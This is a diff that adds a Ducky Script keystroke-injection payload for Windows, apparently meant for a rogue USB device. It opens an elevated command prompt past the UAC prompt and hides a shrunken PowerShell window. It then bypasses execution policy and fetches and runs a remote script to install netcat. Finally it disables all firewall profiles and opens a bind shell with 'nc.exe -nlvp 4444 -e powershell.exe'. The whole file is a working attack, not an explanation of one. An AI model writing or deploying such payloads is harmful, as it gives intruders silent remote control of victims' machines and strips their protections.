@@ -1,0 +1,42 @@
+DELAY 1000
+WINDOWS R
+DELAY 1000
+STRING powershell Start-Process cmd -Verb RunAs
+DELAY 1000
+TAB
+DELAY 1000
+ENTER
+DELAY 1000
+TAB
+DELAY 2000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+ENTER
+DELAY 1000
+STRING powershell.exe -noexit -command '[console]::WindowWidth=5; [console]::WindowHeight=5; [console]::BufferWidth=[console]::WindowWidth'
+DELAY 1000
+ENTER
+DELAY 1000
+STRING Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
+DELAY 1000
+ENTER
+DELAY 10000
+ENTER
+DELAY 1000
+STRING choco install netcat
+DELAY 2000
+ENTER
+DELAY 2000
+STRING A
+DELAY 2000
+ENTER
+DELAY 10000
+STRING Set-NetFirewallProfile -Enabled False
+DELAY 1000
+ENTER
+DELAY 2000
+STRING nc.exe -nlvp 4444 -e powershell.exe
+DELAY 1000
+ENTER
